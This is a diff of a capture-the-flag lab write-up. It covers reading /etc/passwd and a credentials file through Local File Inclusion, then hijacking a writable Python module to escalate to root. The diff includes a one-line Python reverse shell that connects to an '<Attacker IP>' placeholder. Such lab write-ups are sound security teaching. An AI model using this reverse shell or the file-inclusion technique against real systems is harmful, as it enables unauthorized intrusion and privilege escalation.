@@ -46,13 +46,12 @@ The scan returned four interesting paths:
 `/images` → site images     
 `/robots.txt` → standard crawler instructions
 
-![robots.txt| allow flag1.txt](media/04.png)
-
 The `robots.txt` file pointed me to my first flag, but attempting to access `/secret_file_do_not_share` didn’t work.
 
+![robots.txt| allow flag1.txt](media/04.png)    
 ![flag 1](media/05.png)
 
-While exploring the site further, I noticed something interesting: when clicking on images, the URL changed from a simple page like `image.php` to a parameterized version such as:
+While exploring the site further, I noticed something interesting: when clicking on images, the URL changed from a simple page like `image.php` to a parameterized version such as: `/post.php?post=`.
 
 ![there it is](media/06.png)
 
@@ -60,13 +59,14 @@ This hinted at a `Local File Inclusion` vulnerability and testing it by attempti
 
 ![passwd](media/07.png)
 
-Viewing the page source made the output easier to read, and from the contents of `/etc/passwd` I identified three system users of interest:
+Viewing the page´s source made the output easier to read, and from the contents of `/etc/passwd` I identified three system users of interest:
 
 `Will`, `Mat` and `Toby`.
 
 ![here are they!](media/08.png)
 
-Since the `LFI` worked, I used it again to read the previously discovered `secret_file_do_not_read.txt`. This file contained a message revealing the credentials for the user `ftpuser`, along with a hint about where important files might be stored.
+Since the `LFI` worked, I used it again to read the previously discovered `secret_file_do_not_read.txt`.    
+This file contained a message revealing the credentials for the user `ftpuser`, along with a hint about where important files might be stored.
 
 ![creds and ftp files](media/09.png)
 
@@ -192,12 +192,12 @@ Looking at `cmd.py`, it simply defined a small dictionary that mapped numbers to
 
 Because `cmd.py` was writable by Mat, I replaced its contents with my own script. This allowed me to control what happened when `will_script.py` imported it.
 
-![media](media/31.png)
-
 ```bash
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Attacker IP>",<Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > cmd.py
 ```
 `I also saved this script separately in the directory for easier reference.`
+
+![media](media/31.png)
 
 With `cmd.py` modified, the next step was simply to run the allowed script as Will:
 
@@ -238,5 +238,6 @@ This provided a `root` shell.
 And the `root` flag.
 
 ![media](media/37.png)
+
 
 ---
